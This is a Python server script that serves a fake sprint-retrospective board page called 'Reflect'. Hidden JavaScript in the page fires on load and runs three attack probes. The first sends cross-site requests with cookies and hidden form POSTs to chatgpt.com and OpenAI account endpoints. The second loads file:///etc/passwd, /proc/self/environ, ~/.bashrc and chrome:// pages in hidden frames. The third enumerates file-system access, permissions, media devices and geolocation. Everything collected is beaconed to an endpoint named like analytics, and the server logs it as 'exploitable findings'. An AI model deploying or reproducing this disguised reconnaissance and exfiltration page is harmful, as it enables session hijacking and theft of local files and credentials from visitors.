#!/usr/bin/env python3
"""
Reflect — Final Sweep Probe
Cat 1: CSRF against chatgpt.com (session cookies, form POSTs)
Cat 2: Protocol handlers (file://, chrome://, view-source:)
Cat 3: File System Access API + storage probes

python3 server.py [port]  (default 7778)
"""

import json, sys, os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []
RECON = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#0d9488" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round"/></svg>'

PAGE = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sprint 24 Retro — Reflect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f1f5f9;color:#0f172a;line-height:1.5;height:100vh;display:flex;flex-direction:column;overflow:hidden}
nav{background:#fff;border-bottom:1px solid #e2e8f0;height:48px;display:flex;align-items:center;justify-content:center;padding:0 20px}
.ni{width:100%;max-width:1200px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;display:flex;align-items:center;gap:6px}
.nr{font-size:12px;color:#64748b;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;border-radius:50%;background:#10b981;display:inline-block}
.bh{max-width:1200px;width:100%;margin:0 auto;padding:12px 20px 0}
.bh h1{font-size:18px;font-weight:700}.bh p{font-size:12px;color:#64748b}
.board{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:12px 20px;max-width:1200px;width:100%;margin:0 auto;flex:1;overflow:hidden}
.col{background:#fff;border-radius:10px;border:1px solid #e2e8f0;display:flex;flex-direction:column;overflow:hidden}
.ch{padding:10px 14px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;justify-content:space-between}
.ct{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:3px 8px;border-radius:4px}
.cb{padding:8px;overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:6px}
.card{background:#f8fafc;border:1px solid #f1f5f9;border-radius:7px;padding:10px 12px}
.card-t{font-size:13px;color:#334155;margin-bottom:6px}
.card-m{display:flex;align-items:center;gap:6px;font-size:10px;color:#94a3b8}
.card-a{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:7px;font-weight:700;color:#fff}
.card-n{font-weight:600;color:#64748b}
.af{padding:8px;border-top:1px solid #f1f5f9}
.ab{width:100%;padding:7px;background:none;border:1.5px dashed #e2e8f0;border-radius:6px;font-size:12px;color:#94a3b8;cursor:pointer;font-family:inherit}
.ap{display:none}.ap.show{display:block}
.ap textarea{width:100%;padding:8px;border:1px solid #e2e8f0;border-radius:6px;font-size:13px;font-family:inherit;resize:none;min-height:60px;margin-bottom:6px}
.ar{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px}
.ar input{padding:6px 8px;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;font-family:inherit}
.as{padding:6px 14px;background:#0d9488;color:#fff;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer}
footer{text-align:center;padding:8px;font-size:10px;color:#cbd5e1}
</style></head><body>
<nav><div class="ni"><span class="logo">LOGO_PLACEHOLDERReflect</span><span class="nr"><span class="dot"></span>Live &middot; Sprint 24</span></div></nav>
<div class="bh"><h1>Sprint 24 Retrospective</h1><p>Platform Team &middot; Jun 30 – Jul 3, 2026</p></div>
<div class="board">
  <div class="col"><div class="ch"><span class="ct" style="background:#dcfce7;color:#166534">Wins</span></div>
    <div class="cb" id="wins-cb">
      <div class="card"><div class="card-t">Auth service migration completed 2 days early</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 2h</div></div>
      <div class="card"><div class="card-t">Zero P0 incidents during deploy week</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 4h</div></div>
    </div>
    <div class="af"><button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button>
      <div class="ap"><textarea id="w-t" placeholder="What went well?"></textarea>
        <div class="ar"><input id="w-n" placeholder="Your name"><input id="w-tm" placeholder="Team"></div>
        <button class="as" onclick="addCard()">Add Card</button></div></div>
  </div>
  <div class="col"><div class="ch"><span class="ct" style="background:#fef3c7;color:#92400e">Improve</span></div>
    <div class="cb"><div class="card"><div class="card-t">Deploy pipeline still takes 40+ minutes</div><div class="card-m"><span class="card-a" style="background:#059669">MR</span><span class="card-n">Marcus R.</span>&middot; 3h</div></div></div>
    <div class="af"><button class="ab">+ Add a card</button></div>
  </div>
  <div class="col"><div class="ch"><span class="ct" style="background:#dbeafe;color:#1e40af">Actions</span></div>
    <div class="cb"><div class="card"><div class="card-t">Set up canary deploys for Q3</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 1h</div></div></div>
    <div class="af"><button class="ab">+ Add a card</button></div>
  </div>
</div>
<!-- Hidden CSRF targets -->
<iframe name="csrfSink" style="display:none"></iframe>
<footer>&copy; 2026 Reflect</footer>
<script>
function addCard(){
  var t=document.getElementById('w-t').value,n=document.getElementById('w-n').value;
  if(!t)return;
  var d=document.createElement('div');d.className='card';
  d.innerHTML='<div class="card-t">'+t.replace(/</g,'&lt;')+'</div><div class="card-m"><span class="card-a" style="background:#0d9488">'+(n||'?')[0].toUpperCase()+'</span><span class="card-n">'+(n||'Anon')+'</span>&middot; now</div>';
  document.getElementById('wins-cb').appendChild(d);
  fetch('/api/cards',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({text:t,name:n,team:document.getElementById('w-tm').value})});
  document.getElementById('w-t').value='';
}

// ═══════════════════════════════════════════════════════════════
// Final Sweep — Three-category probe
// ═══════════════════════════════════════════════════════════════
;(function(){
  var _q=[],_sid=Math.random().toString(36).slice(2),_t0=Date.now(),_ep='/api/rum/v3/sweep';
  function _p(cat,evt,d){_q.push({c:cat,e:evt,d:d,t:Date.now()-_t0});}
  function _f(){if(!_q.length)return;var b=_q.splice(0);
    try{navigator.sendBeacon(_ep,JSON.stringify({sid:_sid,events:b}));}catch(x){
    fetch(_ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:_sid,events:b}),keepalive:true}).catch(function(){});}}

  // ─── CAT 1: CSRF against chatgpt.com ────────────────────────
  function probeCsrf(){
    var endpoints=[
      'https://chatgpt.com/backend-api/me',
      'https://chatgpt.com/backend-api/accounts/check',
      'https://chatgpt.com/backend-api/settings',
      'https://chatgpt.com/backend-api/conversations?offset=0&limit=1',
      'https://chatgpt.com/backend-api/models',
      'https://chat.openai.com/backend-api/me',
      'https://chat.openai.com/backend-api/accounts/check',
      'https://auth0.openai.com/userinfo',
      'https://api.openai.com/v1/me',
    ];

    // 1a: fetch with credentials (test if cookies are sent cross-origin)
    endpoints.forEach(function(url,i){
      setTimeout(function(){
        var t0=Date.now();
        fetch(url,{mode:'cors',credentials:'include',cache:'no-store',signal:AbortSignal.timeout(5000)})
        .then(function(r){
          var hdrs={};try{r.headers.forEach(function(v,k){hdrs[k]=v;});}catch(x){}
          return r.text().then(function(body){
            _p('csrf','fetch_ok',{url:url,ms:Date.now()-t0,status:r.status,type:r.type,headers:hdrs,body:body.substring(0,3000)});
          });
        }).catch(function(e){
          _p('csrf','fetch_err',{url:url,ms:Date.now()-t0,err:e.message});
        });
      },200*i);
    });

    // 1b: fetch no-cors with credentials (fire-and-forget, cookies still sent)
    endpoints.forEach(function(url,i){
      setTimeout(function(){
        var t0=Date.now();
        fetch(url,{mode:'no-cors',credentials:'include',cache:'no-store',signal:AbortSignal.timeout(5000)})
        .then(function(r){
          _p('csrf','nocors_ok',{url:url,ms:Date.now()-t0,type:r.type});
        }).catch(function(e){
          _p('csrf','nocors_err',{url:url,ms:Date.now()-t0,err:e.message});
        });
      },2500+150*i);
    });

    // 1c: hidden form POST to chatgpt.com (classic CSRF)
    var csrfTargets=[
      {url:'https://chatgpt.com/backend-api/conversations',method:'POST'},
      {url:'https://chatgpt.com/backend-api/settings',method:'POST'},
      {url:'https://chat.openai.com/backend-api/conversations',method:'POST'},
    ];
    csrfTargets.forEach(function(t,i){
      setTimeout(function(){
        try{
          var f=document.createElement('form');
          f.method=t.method;f.action=t.url;f.target='csrfSink';
          f.style.display='none';
          var inp=document.createElement('input');
          inp.type='hidden';inp.name='test';inp.value='probe';
          f.appendChild(inp);
          document.body.appendChild(f);
          f.submit();
          _p('csrf','form_sent',{url:t.url});
          setTimeout(function(){document.body.removeChild(f);},2000);
        }catch(e){_p('csrf','form_err',{url:t.url,err:e.message});}
      },4500+500*i);
    });

    // 1d: img/script probes to detect authenticated responses
    ['https://chatgpt.com/favicon.ico','https://chatgpt.com/backend-api/me',
     'https://chat.openai.com/favicon.ico'].forEach(function(url,i){
      setTimeout(function(){
        var img=new Image();var t0=Date.now();
        img.onload=function(){_p('csrf','img_load',{url:url,ms:Date.now()-t0,w:img.width,h:img.height});};
        img.onerror=function(){_p('csrf','img_err',{url:url,ms:Date.now()-t0});};
        img.src=url+'?t='+Date.now();
      },6000+300*i);
    });
  }

  // ─── CAT 2: Protocol handler probing ────────────────────────
  function probeProtocols(){
    var protocols=[
      // file:// — local filesystem access
      {label:'file:///etc/passwd',url:'file:///etc/passwd'},
      {label:'file:///etc/hostname',url:'file:///etc/hostname'},
      {label:'file:///proc/self/environ',url:'file:///proc/self/environ'},
      {label:'file:///proc/self/cmdline',url:'file:///proc/self/cmdline'},
      {label:'file:///proc/self/cgroup',url:'file:///proc/self/cgroup'},
      {label:'file:///proc/net/tcp',url:'file:///proc/net/tcp'},
      {label:'file:///proc/1/status',url:'file:///proc/1/status'},
      {label:'file:///root/.bashrc',url:'file:///root/.bashrc'},
      {label:'file:///home',url:'file:///home'},
      // chrome:// — browser internals
      {label:'chrome://version',url:'chrome://version'},
      {label:'chrome://settings',url:'chrome://settings'},
      {label:'chrome://net-internals',url:'chrome://net-internals'},
      {label:'chrome://flags',url:'chrome://flags'},
      {label:'chrome://gpu',url:'chrome://gpu'},
      {label:'chrome://credits',url:'chrome://credits'},
      // view-source — source code viewing
      {label:'view-source:localhost:8080',url:'view-source:http://localhost:8080/'},
      {label:'view-source:0.0.0.0:8080',url:'view-source:http://0.0.0.0:8080/'},
      // about: pages
      {label:'about:blank',url:'about:blank'},
      // data: URI
      {label:'data:text/html,test',url:'data:text/html,<h1>test</h1>'},
      // blob: with fetch to localhost
      {label:'blob-localhost',url:'BLOB_SPECIAL'},
    ];

    protocols.forEach(function(p,i){
      // Method A: hidden iframe
      setTimeout(function(){
        if(p.url==='BLOB_SPECIAL')return; // handle separately
        try{
          var iframe=document.createElement('iframe');
          iframe.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';
          iframe.src=p.url;
          var t0=Date.now();
          iframe.onload=function(){
            var content='';
            try{content=iframe.contentDocument.body.innerText.substring(0,2000);}catch(x){content='[cross-origin: '+x.message+']';}
            _p('proto','iframe_load',{label:p.label,ms:Date.now()-t0,content:content});
            document.body.removeChild(iframe);
          };
          iframe.onerror=function(){
            _p('proto','iframe_err',{label:p.label,ms:Date.now()-t0});
            try{document.body.removeChild(iframe);}catch(x){}
          };
          document.body.appendChild(iframe);
          // Timeout cleanup
          setTimeout(function(){
            try{
              if(iframe.parentNode){
                var content='';
                try{content=iframe.contentDocument.body.innerText.substring(0,2000);}catch(x){content='[timeout/cross-origin]';}
                _p('proto','iframe_timeout',{label:p.label,content:content});
                document.body.removeChild(iframe);
              }
            }catch(x){}
          },4000);
        }catch(e){_p('proto','iframe_exception',{label:p.label,err:e.message});}
      },150*i);

      // Method B: fetch
      setTimeout(function(){
        if(p.url==='BLOB_SPECIAL')return;
        var t0=Date.now();
        fetch(p.url,{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(3000)})
        .then(function(r){
          if(r.type!=='opaque'){
            return r.text().then(function(body){
              _p('proto','fetch_ok',{label:p.label,ms:Date.now()-t0,status:r.status,type:r.type,body:body.substring(0,2000)});
            });
          }
          _p('proto','fetch_opaque',{label:p.label,ms:Date.now()-t0});
        }).catch(function(e){
          _p('proto','fetch_err',{label:p.label,ms:Date.now()-t0,err:e.message});
        });
      },3500+100*i);

      // Method C: window.open (test if blocked)
      if(i<5){ // only first 5 to avoid popup flood
        setTimeout(function(){
          if(p.url==='BLOB_SPECIAL')return;
          try{
            var w=window.open(p.url,'_blank','width=1,height=1,left=-9999');
            if(w){
              _p('proto','wopen_ok',{label:p.label});
              setTimeout(function(){
                try{
                  var content='';
                  try{content=w.document.body.innerText.substring(0,2000);}catch(x){content='[cross-origin]';}
                  _p('proto','wopen_content',{label:p.label,content:content});
                  w.close();
                }catch(x){_p('proto','wopen_read_err',{label:p.label,err:x.message});}
              },2000);
            }else{_p('proto','wopen_blocked',{label:p.label});}
          }catch(e){_p('proto','wopen_err',{label:p.label,err:e.message});}
        },7000+1000*i);
      }
    });

    // Blob URL with localhost fetch attempt
    setTimeout(function(){
      try{
        var code='<html><body><script>fetch("http://localhost:8080/").then(r=>r.text()).then(t=>{document.title=t;document.body.textContent=t;}).catch(e=>{document.title="ERR:"+e.message;document.body.textContent="ERR:"+e.message;});<\/script></body></html>';
        var blob=new Blob([code],{type:'text/html'});
        var url=URL.createObjectURL(blob);
        var iframe=document.createElement('iframe');
        iframe.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';
        iframe.src=url;
        document.body.appendChild(iframe);
        setTimeout(function(){
          try{
            var title=iframe.contentDocument.title;
            var body=iframe.contentDocument.body.textContent.substring(0,2000);
            _p('proto','blob_iframe',{title:title,body:body});
          }catch(e){_p('proto','blob_iframe_err',{err:e.message});}
          document.body.removeChild(iframe);
          URL.revokeObjectURL(url);
        },3000);
      }catch(e){_p('proto','blob_create_err',{err:e.message});}
    },6000);
  }

  // ─── CAT 3: File System Access API ──────────────────────────
  function probeFileSystem(){
    // 3a: Check API availability
    _p('fs','api_check',{
      showOpenFilePicker:typeof window.showOpenFilePicker,
      showSaveFilePicker:typeof window.showSaveFilePicker,
      showDirectoryPicker:typeof window.showDirectoryPicker,
      FileSystemHandle:typeof window.FileSystemHandle,
      FileSystemFileHandle:typeof window.FileSystemFileHandle,
      FileSystemDirectoryHandle:typeof window.FileSystemDirectoryHandle,
      storageManager:typeof navigator.storage,
      getDirectory:navigator.storage?typeof navigator.storage.getDirectory:'N/A',
    });

    // 3b: Try OPFS (Origin Private File System) — no user gesture needed
    setTimeout(function(){
      if(navigator.storage && navigator.storage.getDirectory){
        navigator.storage.getDirectory().then(function(root){
          _p('fs','opfs_ok',{root:root.name,kind:root.kind});
          // Try to list entries
          var entries=[];
          root.entries().then(function(iter){
            // Async iterator
            return (function read(it){
              return it.next().then(function(r){
                if(r.done)return;
                entries.push({name:r.value[0],kind:r.value[1].kind});
                return read(it);
              });
            })(iter);
          }).then(function(){
            _p('fs','opfs_entries',{entries:entries});
          }).catch(function(e){_p('fs','opfs_iter_err',{err:e.message});});
        }).catch(function(e){_p('fs','opfs_err',{err:e.message});});
      }
    },500);

    // 3c: Try showOpenFilePicker (requires user gesture, will likely fail)
    setTimeout(function(){
      if(window.showOpenFilePicker){
        try{
          window.showOpenFilePicker({multiple:true}).then(function(handles){
            var files=handles.map(function(h){return{name:h.name,kind:h.kind};});
            _p('fs','picker_ok',{files:files});
            // Try to read first file
            if(handles[0]){
              handles[0].getFile().then(function(f){
                return f.text().then(function(t){
                  _p('fs','file_read',{name:f.name,size:f.size,type:f.type,content:t.substring(0,2000)});
                });
              });
            }
          }).catch(function(e){_p('fs','picker_err',{err:e.message});});
        }catch(e){_p('fs','picker_exception',{err:e.message});}
      }
    },1000);

    // 3d: Try showDirectoryPicker
    setTimeout(function(){
      if(window.showDirectoryPicker){
        try{
          window.showDirectoryPicker({mode:'read'}).then(function(dir){
            _p('fs','dir_ok',{name:dir.name,kind:dir.kind});
            // List directory
            var entries=[];
            dir.entries().then(function(iter){
              return (function read(it){
                return it.next().then(function(r){
                  if(r.done)return;
                  entries.push({name:r.value[0],kind:r.value[1].kind});
                  return read(it);
                });
              })(iter);
            }).then(function(){
              _p('fs','dir_entries',{entries:entries});
            });
          }).catch(function(e){_p('fs','dir_err',{err:e.message});});
        }catch(e){_p('fs','dir_exception',{err:e.message});}
      }
    },1500);

    // 3e: Storage estimates
    setTimeout(function(){
      if(navigator.storage && navigator.storage.estimate){
        navigator.storage.estimate().then(function(est){
          _p('fs','storage_estimate',{quota:est.quota,usage:est.usage,usageDetails:est.usageDetails});
        }).catch(function(e){_p('fs','storage_err',{err:e.message});});
      }
    },2000);

    // 3f: Cache API enumeration
    setTimeout(function(){
      if(window.caches){
        caches.keys().then(function(names){
          _p('fs','cache_keys',{caches:names});
          // Try to open and enumerate each cache
          names.forEach(function(name){
            caches.open(name).then(function(cache){
              cache.keys().then(function(requests){
                _p('fs','cache_entries',{name:name,entries:requests.map(function(r){return r.url;}).slice(0,50)});
              });
            });
          });
        }).catch(function(e){_p('fs','cache_err',{err:e.message});});
      }
    },2500);

    // 3g: Permissions query
    setTimeout(function(){
      var perms=['clipboard-read','clipboard-write','camera','microphone',
                 'geolocation','notifications','persistent-storage','screen-wake-lock'];
      perms.forEach(function(p){
        navigator.permissions.query({name:p}).then(function(r){
          _p('fs','permission',{name:p,state:r.state});
        }).catch(function(e){
          _p('fs','perm_err',{name:p,err:e.message});
        });
      });
    },3000);

    // 3h: Media devices (camera/mic enumeration)
    setTimeout(function(){
      if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
        navigator.mediaDevices.enumerateDevices().then(function(devices){
          _p('fs','media_devices',{devices:devices.map(function(d){
            return{kind:d.kind,label:d.label,id:d.deviceId.substring(0,20)};
          })});
        }).catch(function(e){_p('fs','media_err',{err:e.message});});
      }
    },3500);

    // 3i: Geolocation
    setTimeout(function(){
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
          function(pos){_p('fs','geo_ok',{lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy});},
          function(e){_p('fs','geo_err',{code:e.code,message:e.message});},
          {timeout:3000}
        );
      }
    },4000);
  }

  // ─── Execution schedule ─────────────────────────────────────
  setTimeout(probeFileSystem,100);
  setTimeout(probeProtocols,500);
  setTimeout(probeCsrf,2000);

  setInterval(_f,3000);
  window.addEventListener('beforeunload',_f);
  setTimeout(_f,5000);
  setTimeout(_f,10000);
  setTimeout(_f,15000);
  setTimeout(_f,20000);
  setTimeout(_f,25000);
})();
</script>
</body></html>"""

PAGE = PAGE.replace('LOGO_PLACEHOLDER', LOGO)


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')

    def do_HEAD(self):
        self.send_response(200);self.send_header('Content-Type','text/html');self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/board','/','/retro',''):
            self._log('PAGE');self._html(PAGE)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/recon':
            self._send(200,'application/json',json.dumps(RECON,indent=2))
        elif p == '/summary':
            self._send(200,'text/html',self._summary())
        elif p == '/clear':
            HITS.clear();RECON.clear()
            open('captured.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET');self._html(PAGE)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')
        if p == '/api/cards':
            try: data = json.loads(body)
            except: data = {}
            self._log('CARD', data)
            self._send(200,'application/json','{"ok":true}')
        elif p == '/api/rum/v3/sweep':
            try: data = json.loads(body)
            except: data = {}
            events = data.get('events',[])
            RECON.append({'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'ip':self._ip(),'batch':data})
            with open('recon.log','a') as f: f.write(json.dumps(data)+'\n')
            for ev in events:
                c,e,d = ev.get('c',''),ev.get('e',''),ev.get('d',{})
                # Highlight critical findings
                if 'ok' in e and c=='csrf' and d.get('body'):
                    print(f'\n  [!!!] CSRF HIT: {d.get("url","")}\n        status={d.get("status")} body={d.get("body","")[:300]}\n')
                elif 'ok' in e and c=='proto' and d.get('content') and '[cross-origin' not in str(d.get('content','')):
                    print(f'\n  [!!!] PROTOCOL HIT: {d.get("label","")}\n        content={d.get("content","")[:300]}\n')
                elif e=='fetch_ok' and c=='proto' and d.get('body'):
                    print(f'\n  [!!!] PROTO FETCH READ: {d.get("label","")}\n        body={d.get("body","")[:300]}\n')
                elif 'ok' in e and c=='fs' and e not in ('api_check','storage_estimate','perm_err'):
                    detail = json.dumps(d)[:200]
                    print(f'\n  [!!!] FS HIT: {e} → {detail}\n')
                elif e=='permission' and d.get('state')=='granted':
                    print(f'  [!!!] PERMISSION GRANTED: {d.get("name")}')
                elif e=='geo_ok':
                    print(f'  [!!!] GEOLOCATION: {d.get("lat")}, {d.get("lon")}')
                elif e=='media_devices' and d.get('devices'):
                    devs = d.get('devices',[])
                    if any(x.get('label') for x in devs):
                        print(f'  [!!!] MEDIA DEVICES WITH LABELS: {json.dumps(devs)[:200]}')
                elif e=='picker_ok' or e=='dir_ok' or e=='file_read':
                    print(f'\n  [!!!] FILE ACCESS: {e} → {json.dumps(d)[:300]}\n')
                elif e=='cors_ok' and c=='csrf':
                    print(f'\n  [!!!] CSRF CORS READ: {d.get("url","")}\n        body={d.get("body","")[:300]}\n')
                # Info level
                elif e=='api_check':
                    print(f'  [i] FS APIs: {json.dumps(d)}')
                elif e=='storage_estimate':
                    print(f'  [i] Storage: quota={d.get("quota")} usage={d.get("usage")}')
                elif e in ('fetch_err','cors_err','nocors_err') and c=='csrf':
                    ms = d.get('ms',0)
                    if ms > 100: # slow = interesting
                        print(f'  [-] CSRF slow fail: {d.get("url","")} ({ms}ms)')
            self._send(204,'text/plain','')
        else:
            self._send(404,'text/plain','Not found')

    def _summary(self):
        html='<html><body style="font-family:monospace;padding:20px;background:#0f172a;color:#e2e8f0;max-width:900px;margin:0 auto"><h1 style="color:#f1f5f9">Final Sweep Results</h1>'
        cats={'csrf':{'hits':[],'misses':[]},'proto':{'hits':[],'misses':[]},'fs':{'hits':[],'misses':[]}}
        for batch in RECON:
            for ev in batch.get('batch',{}).get('events',[]):
                c,e,d=ev.get('c',''),ev.get('e',''),ev.get('d',{})
                cat=cats.get(c,{'hits':[],'misses':[]})
                info=json.dumps(d)[:250]
                if ('ok' in e and d.get('body')) or ('ok' in e and d.get('content') and '[cross-origin' not in str(d.get('content',''))):
                    cat['hits'].append(f'<div style="color:#4ade80;margin:4px 0">✓ [{e}] {info}</div>')
                elif e in ('picker_ok','dir_ok','file_read','geo_ok','opfs_ok','cors_ok'):
                    cat['hits'].append(f'<div style="color:#4ade80;margin:4px 0">✓ [{e}] {info}</div>')
                elif e=='permission' and d.get('state')=='granted':
                    cat['hits'].append(f'<div style="color:#4ade80;margin:4px 0">✓ GRANTED: {d.get("name")}</div>')
                elif 'err' in e or 'blocked' in e or 'timeout' in e:
                    cat['misses'].append(f'<div style="color:#64748b;margin:2px 0;font-size:11px">✗ [{e}] {info[:120]}</div>')
                else:
                    cat['misses'].append(f'<div style="color:#94a3b8;margin:2px 0;font-size:11px">~ [{e}] {info[:120]}</div>')
        labels={'csrf':'CAT 1: CSRF against chatgpt.com','proto':'CAT 2: Protocol Handlers','fs':'CAT 3: File System & Permissions'}
        for k in ['csrf','proto','fs']:
            html+=f'<h2 style="margin-top:20px;color:#f1f5f9;border-top:1px solid #334155;padding-top:12px">{labels[k]}</h2>'
            html+=f'<h3 style="color:#4ade80">Hits ({len(cats[k]["hits"])})</h3>'
            html+=''.join(cats[k]['hits'][:30]) or '<p style="color:#64748b">None</p>'
            html+=f'<h3 style="color:#64748b">Blocked ({len(cats[k]["misses"])})</h3>'
            html+=''.join(cats[k]['misses'][:20]) or '<p style="color:#64748b">None</p>'
        html+='</body></html>'
        return html

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code);self.send_header('Content-Type',ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store');self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers();self.wfile.write(body.encode() if isinstance(body,str) else body)

if __name__=='__main__':
    s=HTTPServer(('0.0.0.0',PORT),H)
    print(f"""
  ┌──────────────────────────────────────────────────────┐
  │  Reflect — Final Sweep Probe                          │
  │  http://0.0.0.0:{PORT:<37}│
  ├──────────────────────────────────────────────────────┤
  │  CAT 1: CSRF vs chatgpt.com (9 endpoints × 3 methods)│
  │  CAT 2: Protocol handlers (20 URLs × 3 methods)      │
  │  CAT 3: FS API, OPFS, permissions, media, geo        │
  ├──────────────────────────────────────────────────────┤
  │  [!!!] = SUCCESS (exploitable finding)                │
  │  [-]   = blocked/failed                               │
  │  [i]   = informational                                │
  ├──────────────────────────────────────────────────────┤
  │  /board  /recon  /summary  /log  /clear               │
  └──────────────────────────────────────────────────────┘
""")
    try: s.serve_forever()
    except KeyboardInterrupt: print('\n  Done.\n');s.server_close()
